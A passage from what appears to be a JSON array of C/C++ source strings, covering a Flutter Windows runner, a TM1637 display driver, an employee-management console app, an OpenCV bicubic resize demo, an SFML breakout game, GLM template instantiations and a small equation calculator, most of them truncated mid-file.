wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "extern \"C\" {\n  #include <stdlib.h>\n  #include <string.h>\n  #include <inttypes.h>\n}\n\n#include <tm1637_hal.h>\n\nstatic void __bitDelay();\nstatic void __start();\nstatic void __stop();\nstatic bool __writeByte(uint8_t b);\nstatic void __showDots(uint8_t dots, uint8_t* digits);\nstatic void __setGPIODIOInput(void);\nstatic void __setGPIODIOOutput(void);\nstatic void __setGPIOClkInput(void);\nstatic void __setGPIOClkOutput(void);\nstatic void __DelayMicroseconds(uint32_t us);\n\nstatic uint8_t __m_brightness;\nstatic unsigned int __m_bitDelay;\nstatic GPIO_InitTypeDef m_gpioDIO;\nstatic GPIO_InitTypeDef m_gpioClk;\n\n#define TM1637_I2C_COMM1    0x40\n#define TM1637_I2C_COMM2    0xC0\n#define TM1637_I2C_COMM3    0x80\n\n#define CLK_LOW HAL_GPIO_WritePin(GPIOB, GPIO_PIN_12, GPIO_PIN_RESET);\n\n//\n//      A\n//     ---\n//  F |   | B\n//     -G-\n//  E |   | C\n//     ---\n//      D\nstatic const uint8_t digitToSegment[] = {\n // XGFEDCBA\n  0b00111111,    // 0\n  0b00000110,    // 1\n  0b01011011,    // 2\n  0b01001111,    // 3\n  0b01100110,    // 4\n  0b01101101,    // 5\n  0b01111101,    // 6\n  0b00000111,    // 7\n  0b01111111,    // 8\n  0b01101111,    // 9\n  0b01110111,    // A\n  0b01111100,    // b\n  0b00111001,    // C\n  0b01011110,    // d\n  0b01111001,    // E\n  0b01110001     // F\n  };\n\nstatic const uint8_t minusSegments = 0b01000000;\n\nvoid tm1637_init(unsigned int bitDelay) {\n  __m_bitDelay = bitDelay;\n  ENABLE_GPIOS;\n}\n\nvoid tm1637_setBrightness(uint8_t brightness, bool on) {\n\t__m_brightness = (brightness & 0x7) | (on? 0x08 : 0x00);\n}\n\nvoid tm1637_setSegments(const uint8_t segments[], uint8_t length, uint8_t pos) {\n    // Write COMM1\n\t__start();\n\t__writeByte(TM1637_I2C_COMM1);\n\t__stop();\n\n\t// Write COMM2 + first digit address\n\t__start();\n\t__writeByte(TM1637_I2C_COMM2 + (pos & 0x03));\n\n\t// Write the data bytes\n\tfor (uint8_t k=0; k < length; k++)\n\t  __writeByte(segments[k]);\n\n\t__stop();\n\n\t// Write COMM3 + brightness\n\t__start();\n\t__writeByte(TM1637_I2C_COMM3 + (__m_brightness & 0x0f));\n\t__stop();\n\n}\n\nvoid tm1637_clear(void) {\n    uint8_t data[] = { 0, 0, 0, 0 };\n\ttm1637_setSegments(data,__TM1637_DEFAULT_LENGTH ,__TM1637_DEFAULT_POS);\n}\n\nvoid tm1637_showNumberDec(int num, bool leading_zero , uint8_t length , uint8_t pos)\n{\n  tm1637_showNumberDecEx(num, 0, leading_zero, length, pos);\n}\n\nvoid tm1637_showNumberDecEx(int num, uint8_t dots, bool leading_zero, uint8_t length , uint8_t pos)\n{\n  tm1637_showNumberBaseEx(num < 0? -10 : 10, num < 0? -num : num, dots, leading_zero, length, pos);\n}\n\nvoid tm1637_showNumberHexEx(uint16_t num, uint8_t dots , bool leading_zero , uint8_t length , uint8_t pos )\n{\n  tm1637_showNumberBaseEx(16, num, dots, leading_zero, length, pos);\n}\n\nvoid tm1637_showNumberBaseEx(int8_t base, uint16_t num, uint8_t dots, bool leading_zero,\n                                    uint8_t length, uint8_t pos)\n{\n    bool negative = false;\n\tif (base < 0) {\n\t    base = -base;\n\t\tnegative = true;\n\t}\n\n\n    uint8_t digits[4];\n\n\tif (num == 0 && !leading_zero) {\n\t\t// Singular case - take care separately\n\t\tfor(uint8_t i = 0; i < (length-1); i++)\n\t\t\tdigits[i] = 0;\n\t\tdigits[length-1] = tm1637_encodeDigit(0);\n\t}\n\telse {\n\t\t//uint8_t i = length-1;\n\t\t//if (negative) {\n\t\t//\t// Negative number, show the minus sign\n\t\t//    digits[i] = minusSegments;\n\t\t//\ti--;\n\t\t//}\n\t\t\n\t\tfor(int i = length-1; i >= 0; --i)\n\t\t{\n\t\t    uint8_t digit = num % base;\n\t\t\t\n\t\t\tif (digit == 0 && num == 0 && leading_zero == false)\n\t\t\t    // Leading zero is blank\n\t\t\t\tdigits[i] = 0;\n\t\t\telse\n\t\t\t    digits[i] = tm1637_encodeDigit(digit);\n\t\t\t\t\n\t\t\tif (digit == 0 && num == 0 && negative) {\n\t\t\t    digits[i] = minusSegments;\n\t\t\t\tnegative = false;\n\t\t\t}\n\n\t\t\tnum /= base;\n\t\t}\n    }\n\t\n\tif(dots != 0)\n\t{\n\t\t__showDots(dots, digits);\n\t}\n    \n    tm1637_setSegments(digits, length, pos);\n}\n\nvoid __bitDelay()\n{\n\t__DelayMicroseconds(__m_bitDelay);\n}\n\nvoid __showDots(uint8_t dots, uint8_t* digits)\n{\n    for(int i = 0; i < 4; ++i)\n    {\n        digits[i] |= (dots & 0x80);\n        dots <<= 1;\n    }\n}\n\nuint8_t tm1637_encodeDigit(uint8_t digit)\n{\n\treturn digitToSegment[digit & 0x0f];\n}\n\n\nvoid __start()\n{\n  SET_DIO_OUTPUT;\n  __bitDelay();\n}\n\nvoid __stop()\n{\n  SET_DIO_OUTPUT;\n\t__bitDelay();\n  SET_CLK_INPUT;\n\t__bitDelay();\n  SET_DIO_INPUT;\n\t__bitDelay();\n}\n\nbool __writeByte(uint8_t b)\n{\n  uint8_t data = b;\n  for(uint8_t i = 0; i < 8; i++) {\n    SET_CLK_OUTPUT;\n    __bitDelay();\n    if (data & 0x01) {\n      SET_DIO_INPUT;\n    }\n    else {\n      SET_DIO_OUTPUT;\n    }\n    __bitDelay();\n    SET_CLK_INPUT;\n    __bitDelay();\n    data = data >> 1;\n  }\n  SET_CLK_OUTPUT;\n  SET_DIO_INPUT;\n  __bitDelay();\n  SET_CLK_INPUT;\n  __bitDelay();\n  uint8_t ack = READ_ACK;\n  if (ack == 0) {\n    SET_DIO_OUTPUT;\n  }\n  __bitDelay();\n  SET_CLK_OUTPUT;\n  __bitDelay();\n  return ack;\n}\n\nvoid __setGPIODIOInput(void) {\n\tm_gpioDIO.Pin = GPIO_PIN_13; \n\tm_gpioDIO.Mode = GPIO_MODE_INPUT;\n\tm_gpioDIO.Pull = GPIO_NOPULL;\n\tm_gpioDIO.Speed = GPIO_SPEED_FREQ_HIGH;\n\tHAL_GPIO_Init(GPIOB, &m_gpioDIO);  \n}\n\nvoid __setGPIODIOOutput(void) {\n\tm_gpioDIO.Pin = GP",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\n// Define constants for array sizes\nconst int MAX_EMPLOYEES = 100;\nconst int SALARY_BASE = 2000;\nconst int BONUS_RATE = 500;\n\n// Define Employee structure\nstruct Employee {\n    string name;\n    int id;\n    int salary;\n};\n\n// Function prototypes\nvoid addEmployee(Employee employees[], int &numEmployees);\nvoid viewEmployees(const Employee employees[], int numEmployees);\nvoid calculateTotalPay(Employee employees[], int numEmployees);\nvoid deleteEmployee(Employee employees[], int &numEmployees);\nvoid editEmployee(Employee employees[], int numEmployees);\n\nint main() {\n    Employee employees[MAX_EMPLOYEES];\n    int numEmployees = 0;\n    char choice;\n\n    do {\n        cout << \"Employee Management System\" << endl;\n        cout << \"1. Add Employee\" << endl;\n        cout << \"2. View Employees\" << endl;\n        cout << \"3. Calculate Total Pay\" << endl;\n        cout << \"4. Delete Employee\" << endl;\n        cout << \"5. Edit Employee\" << endl;\n        cout << \"6. Exit\" << endl;\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case '1':\n                addEmployee(employees, numEmployees);\n                break;\n            case '2':\n                viewEmployees(employees, numEmployees);\n                break;\n            case '3':\n                calculateTotalPay(employees, numEmployees);\n                break;\n            case '4':\n                deleteEmployee(employees, numEmployees);\n                break;\n            case '5':\n                editEmployee(employees, numEmployees);\n                break;\n            case '6':\n                cout << \"Exiting program...\" << endl;\n                break;\n            default:\n                cout << \"Invalid choice. Please try again.\" << endl;\n        }\n    } while (choice != '6');\n\n    return 0;\n}\n\n// Function to add a new employee\nvoid addEmployee(Employee employees[], int &numEmployees) {\n    if (numEmployees < MAX_EMPLOYEES) {\n        cout << \"Enter employee name: \";\n        cin >> employees[numEmployees].name;\n        cout << \"Enter employee ID: \";\n        cin >> employees[numEmployees].id;\n        employees[numEmployees].salary = SALARY_BASE;\n        numEmployees++;\n        cout << \"Employee added successfully.\" << endl;\n    } else {\n        cout << \"Maximum number of employees reached.\" << endl;\n    }\n}\n\n// Function to view all employees' details\nvoid viewEmployees(const Employee employees[], int numEmployees) {\n    if (numEmployees == 0) {\n        cout << \"No employees to display.\" << endl;\n    } else {\n        cout << \"Employee details:\" << endl;\n        for (int i = 0; i < numEmployees; ++i) {\n            cout << \"Name: \" << employees[i].name << \", ID: \" << employees[i].id << \", Salary: \" << employees[i].salary << endl;\n        }\n    }\n}\n\n// Function to calculate total pay (salary + bonus) for each employee\nvoid calculateTotalPay(Employee employees[], int numEmployees) {\n    if (numEmployees == 0) {\n        cout << \"No employees to calculate total pay for.\" << endl;\n    } else {\n        cout << \"Total pay for each employee:\" << endl;\n        for (int i = 0; i < numEmployees; ++i) {\n            int totalPay = employees[i].salary + BONUS_RATE;\n            cout << \"Name: \" << employees[i].name << \", Total Pay: \" << totalPay << endl;\n        }\n    }\n}\n\n// Function to delete an employee\nvoid deleteEmployee(Employee employees[], int &numEmployees) {\n    if (numEmployees == 0) {\n        cout << \"No employees to delete.\" << endl;\n        return;\n    }\n\n    int employeeId;\n    cout << \"Enter employee ID to delete: \";\n    cin >> employeeId;\n\n    int indexToDelete = -1;\n    for (int i = 0; i < numEmployees; ++i) {\n        if (employees[i].id == employeeId) {\n            indexToDelete = i;\n            break;\n        }\n    }\n\n    if (indexToDelete != -1) {\n        // Shift elements to the left to overwrite the deleted employee\n        for (int i = indexToDelete; i < numEmployees - 1; ++i) {\n            employees[i] = employees[i + 1];\n        }\n        numEmployees--;\n        cout << \"Employee deleted successfully.\" << endl;\n    } else {\n        cout << \"Employee with ID \" << employeeId << \" not found.\" << endl;\n    }\n}\n\n// Function to edit employee data\nvoid editEmployee(Employee employees[], int numEmployees) {\n    if (numEmployees == 0) {\n        cout << \"No employees to edit.\" << endl;\n        return;\n    }\n\n    int employeeId;\n    cout << \"Enter employee ID to edit: \";\n    cin >> employeeId;\n\n    for (int i = 0; i < numEmployees; ++i) {\n        if (employees[i].id == employeeId) {\n            cout << \"Enter new name for employee \" << employees[i].id << \": \";\n            cin >> employees[i].name;\n            cout << \"Enter new salary for employee \" << employees[i].id << \": \";\n            cin >> employees[i].salary;\n            cout << \"Employee data updated successfully.\" << endl;\n            return;\n        }\n    }\n\n    cout << \"Employee with ID \" << emplo",
    "//\n//  main.cpp\n//  opencv1\n//\n//  Created by Guo on 2023/12/16.\n//\n\n#include <opencv2/opencv.hpp>\n#include <iostream>\n\nusing namespace cv;\nusing namespace std;\n\nfloat hfuction(float x) {\n    float xAbs = abs(x);\n    if (xAbs <= 1) {\n        return pow(xAbs, 3) - 2*pow(xAbs, 2) + 1;\n    } else if (xAbs <= 2) {\n        return -pow(xAbs, 3) + 5 * pow(xAbs, 2) - 8 * xAbs + 4;\n    } else {\n        return 0;\n    }\n}\n\n\nfloat bicubicInterpolate(float p[4][4], float x1,float x2,float x3,float x4, float y1, float y2, float y3, float y4) {\n    float hx[4]={x1,x2,x3,x4};\n    float hy[4]={y1,y2,y3,y4};\n    for(int i=0;i<4;++i){\n        hx[i]=hfuction(hx[i]);\n        hy[i]=hfuction(hy[i]);\n    }\n    \n    float result = 0.0f;\n    for (int i = 0; i < 4; ++i) {\n        for (int j = 0; j < 4; ++j) {\n            result += hx[i] * p[i][j] * hy[j];\n        }\n    }\n    return result;\n}\n\n//float to uchar\nuchar saturate_cast_float_to_uchar(float val) {\n    int iVal = val + 0.5f; // round up\n    if (iVal < 0) return 0;\n    if (iVal > 255) return 255;\n    return iVal; // Direct assignment, implicitly converted to uchar.\n}\n\nVec3b getBicubicInterpolatedPixel(const Mat& img, float x, float y) {\n    Vec3b result;\n    float arr[4][4]; // Used to store the values of the surrounding 16 pixels, which will be used for interpolation calculations\n\n    int ix = floor(x); //ix and iy are the integer parts of the x and y coordinates.\n    int iy = floor(y);\n\n    for (int m = 0; m < 3; m++) {\n        for (int i = -1; i <= 2; i++) {\n            for (int j = -1; j <= 2; j++) {\n                int px = min(max(ix + i, 0), img.cols - 1);\n                int py = min(max(iy + j, 0), img.rows - 1);\n                arr[i + 1][j + 1] = img.at<Vec3b>(py, px)[m];\n            }\n        }\n        result[m] = saturate_cast_float_to_uchar((bicubicInterpolate(arr, 1+x-ix,x-ix,1+ix-x,2+ix-x, 1+y-iy,y-iy,1+iy-y,2+iy-y)));\n    }\n    return result;\n}\n\nMat resizeBicubic(const Mat& input, int newWidth, int newHeight) {\n    Mat output(newHeight, newWidth, input.type());\n\n    float x_ratio = float(input.cols - 1) / newWidth;//Calculated as the horizontal and vertical scaling\n    float y_ratio = float(input.rows - 1) / newHeight;\n    cout << \"width:\" << input.cols << endl;\n    cout << \"height:\" << input.rows << endl;\n    cout << \"newWidth:\" << newWidth << endl;\n    cout << \"newHeight:\" << newHeight << endl;\n    //\u904d\u5386\u65b0\u56fe\u50cf\u7684\u6bcf\u4e2a\u50cf\u7d20\n    for (int i = 0; i < newHeight; i++) {\n        for (int j = 0; j < newWidth; j++) {\n            float x_mapped = j * x_ratio;\n            float y_mapped = i * y_ratio;\n            output.at<Vec3b>(i, j) = getBicubicInterpolatedPixel(input, x_mapped, y_mapped);\n        }\n    }\n    \n    return output;\n}\n\nint main() {\n    int aimed_area_width = 700;\n    int aimed_area_height= 300;\n    \n    Mat img = imread(\"/path/to/mozu1.jpg\");\n    if (img.empty()) {\n        cout << \"Could not open or find the image\" << endl;\n        return -1;\n    }\n\n    Mat resized = resizeBicubic(img, 1024, 720);\n\n    namedWindow(\"Original Image\", WINDOW_AUTOSIZE);\n    namedWindow(\"Resized Image\", WINDOW_AUTOSIZE);\n    imshow(\"Original Image\", img);\n    imshow(\"Resized Image\", resized);\n    \n    Mat grayImage;\n    cvtColor(resized, grayImage, COLOR_BGR2GRAY);\n    // Create a 4x4 matrix to store the pixel values\n    vector<vector<uchar>> pixelMatrix1(4, vector<uchar>(4));\n\n    // Fill Matrix\n    for (int i = 0; i < 4; i++) {\n        for (int j = 0; j < 4; j++) {\n            pixelMatrix1[i][j] = grayImage.at<uchar>(aimed_area_width + i, aimed_area_height + j);\n        }\n    }\n    // Prints grayscale values for specific areas\n    cout << \"4x4 grey value(without opencv function):\" << endl;\n    for (int i = aimed_area_width; i < aimed_area_width+4; i++) {\n        for (int j = aimed_area_height; j < aimed_area_height+4; j++) {\n            cout << setw(4) << static_cast<int>(grayImage.at<uchar>(i, j)) << \" \";\n        }\n        cout << endl;\n    }\n\n    // print 16 RGB pixels of resized image\n//    for (int i = 500; i < 504; i++) {\n//        for (int j = 500; j < 504; j++) {\n//            Vec3b pixel = resized.at<Vec3b>(i, j);\n//            cout << \"Pixel at (\" << i << \", \" << j << \"): \"\n//                 << \"B=\" << int(pixel[0]) << \", \"\n//                 << \"G=\" << int(pixel[1]) << \", \"\n//                 << \"R=\" << int(pixel[2]) << endl;\n//        }\n//    }\n    \n    //use opencv bicubic function\n    Mat resizedWithOpenCV;\n    resize(img, resizedWithOpenCV, Size(1024, 720), 0, 0, INTER_CUBIC);\n    namedWindow(\"Resized by opencv function image\", WINDOW_AUTOSIZE);\n    imshow(\"Resized by opencv function image\", resizedWithOpenCV);\n    \n    // print 16 RGB pixels of resized image by Opencv\n//    for (int i = 500; i < 504; i++) {\n//        for (int j = 500; j < 504; j++) {\n//            Vec3b pixel = resizedWithOpenCV.at<Vec3b>(i, j);\n//            cout << \"Pixel at (\" << i << \", \" << j << \"): \"\n//                 << \"B=\" << int(pixel[0]) << \", \"\n//                 << \"G=\" << int(pixel[1]) <",
    "//  Materia     :   Programacion I\n//  Profesor    :   Ricardo Coppo\n//  Proyecto    :   \"BREAK IT\"\n//  Alumnos     :   Luciano Cossia\n//  Contacto    :   cossialuciano@gmail.com\n\n\n#include <SFML/Graphics.hpp>\n#include <SFML/Audio.hpp>\n#include <cstdlib>\n#include <ctime>\n#include <sstream>\n\nusing namespace sf;\nusing namespace std;\n\nint main()\n{   \n    srand((unsigned int)time(NULL));\n\n    // Set Display\n\n    const float width = 550.f;\n    const float height = 700.f;\n    VideoMode vm(550, 700);\n    RenderWindow window(vm, \"Break it\");\n    window.setFramerateLimit(60);\n\n    // Se cargan las texturas\n\n    Texture tBlock1, tBlock2, tBlock3, tBlock4, tBlock5, tBackground, tBall, tPad;\n    tBlock1.loadFromFile(\"images/block01.png\");\n    tBlock2.loadFromFile(\"images/block02.png\");\n    tBlock3.loadFromFile(\"images/block03.png\");\n    tBlock4.loadFromFile(\"images/block04.png\");\n    tBlock5.loadFromFile(\"images/block05.png\");\n    tBackground.loadFromFile(\"images/background.png\");\n    tBall.loadFromFile(\"images/ball.png\");\n    tPad.loadFromFile(\"images/pad.png\");\n\n    // Creacion de los sprites\n\n    Sprite sBackground(tBackground), sBall(tBall), sPad(tPad); // Ball 12 * 12, Pad 90 * 9 pixeles\n        \n    Sprite block[100];\n    int n = 0;\n    for (int i = 1; i <= 10; i++)\n        for (int j = 1; j <= 10; j++)\n        {\n            if (n < 20)\n                block[n].setTexture(tBlock1);\n            else if (n < 40)\n                block[n].setTexture(tBlock2);\n            else if (n < 60)\n                block[n].setTexture(tBlock3);\n            else if (n < 80)\n                block[n].setTexture(tBlock4);\n            else\n                block[n].setTexture(tBlock5);\n\n            block[n].setPosition(j * 45.f, i * 30.f);\n            n++;\n        }\n\n    // Seteo posicion de sprites\n    sPad.setPosition(width / 2 - 45, height - 10);\n    sBall.setPosition(width / 2 - 6, height - 25);\n    \n    // Preparacion del texto de inicio y score\n\n    Text messageText, scoreText;\n    Font font;\n    \n    font.loadFromFile(\"fonts/KOMIKAP_.ttf\");\n\n    messageText.setFont(font);\n    scoreText.setFont(font);\n\n    messageText.setString(\"Press Space to start!\");\n    scoreText.setString(\"Score = 0\");\n\n    messageText.setCharacterSize(30);\n    scoreText.setCharacterSize(15);\n\n    messageText.setFillColor(Color::White);\n    scoreText.setFillColor(Color::White);\n\n    FloatRect textRect = messageText.getLocalBounds();\n\n    messageText.setOrigin(textRect.left + textRect.width / 2.0f,\n       textRect.top + textRect.height / 2.0f);\n    messageText.setPosition(width / 2.0f, height / 2.0f);\n    scoreText.setPosition(5, 5);\n\n    // Carga en buffer de sonido\n\n    SoundBuffer Buffer;\n    Buffer.loadFromFile(\"sounds/hit.wav\");\n    Sound hitsound;\n    hitsound.setBuffer(Buffer);\n\n\n    float speedX = 5, speedY = 5; // velocidad\n    float x = width / 2.0f - 6, y = height - 25; // posicion de inicio FloatRect\n    bool paused = true;\n    int score = 0;\n    const float padWidth = 90.f;\n    const float padHeight = 9.f;\n    const float ballDim = 12.f;\n   \n    // Procesador de eventos de la interfase gr\u00e1fica\n\n    while (window.isOpen()) {\n\n        // Si recibimos un evento de cierre cerramos el programa\n        // Si no hay eventos para procesar entonces pintamos la ventana\n\n        Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == Event::Closed)\n                window.close();\n        }\n\n        if (Keyboard::isKeyPressed(Keyboard::Space))\n            paused = false;\n\n        if (Keyboard::isKeyPressed(Keyboard::P))\n            paused = true;\n\n        if (!paused) {\n\n            // Se setea el Score\n\n            stringstream contador;\n            contador << \"Score = \" << score << \" /100\";\n            scoreText.setString(contador.str());\n\n            // Se incrementa la posicion de la bola --> velocidad y se crea un rectangulo de colision.\n            // Cuando la bola hace contacto con el bloque, se le asigna una nueva posicion a este ultimo\n            // fuera de la pantalla para que desaparezca.\n            // Luego se cambia la direccion de la bola.\n\n            x += speedX;\n            for (int i = 0; i < n; i++)\n                if (FloatRect(x, y, ballDim / 2.f, ballDim / 2.f).intersects(block[i].getGlobalBounds()))\n                {\n                    block[i].setPosition(-100, 0);\n                    speedX = -speedX;\n                    score++;\n                    hitsound.play();\n                }\n\n            y += speedY;\n            for (int i = 0; i < n; i++)\n                if (FloatRect(x, y , ballDim / 2.f, ballDim / 2.f).intersects(block[i].getGlobalBounds()))\n                {\n                    block[i].setPosition(-100, 0);\n                    speedY = -speedY;\n                    score++;\n                    hitsound.play();\n                }             \n\n            // Input del usuario, movimiento\n            \n            if (Keyboard::isKeyPressed(Keyboard::Right) && sPad.getPosition().x < width ",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include <iostream>\r\nusing namespace std;\r\nint main(){\r\n\t\t\r\n\t\t//\ty = 2+z + (x^2 +5/20) + 5;\r\n\t\t// y = 4x + z;\r\n\t\t// y = 3xz + (x^3 / z^2)\r\n\t\t\r\n\t\tcout<<\"\\n1. y = 2+z + (x^2 + 5/2) + 5.\"<<endl;\r\n\t\tcout<<\"2. y = 4x + z.\"<<endl;\r\n\t\tcout<<\"3. y = 3xz + (x^3 / z^2).\"<<endl;\r\n\t\t\t\r\n\t\tcout<<\"\\n* Which equation would you like to perform?\"<<endl;\r\n\t\tcout<<\"* Enter a number fo the given equations. \"<<endl; \r\n\t\t\r\n\t\tint choice;\r\n\t\tint x;\r\n\t\tint z;\r\n\t\tcin>>choice;\t\t\r\n\tswitch(choice){\r\n\t\t\t\tcase 1:{\r\n\t\t\t\tcout<<\"Ok,\\ny = 2+z + (x^2 + 5/2) + 5\"<<endl;\r\n\t\t\t\tcout<<\". Enter the value of x.\"<<endl;\r\n\t\t\t\tcin>>x;\r\n\t\t\t\tcout<<\". Now, enter the value of z.\"<<endl;\r\n\t\t\t\tcin>>z;\r\n\t\t\t\tcout<<\"y = \"<<2+z + (x^2 + 5/2)<<endl;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tcase 2:{\r\n\t\t\t\tcout<<\"Ok,\\ny = 4x + z\"<<endl;\r\n\t\t\t\tcout<<\". Enter the value of x.\"<<endl;\r\n\t\t\t\tcin>>x;\r\n\t\t\t\tcout<<\". Now, enter the 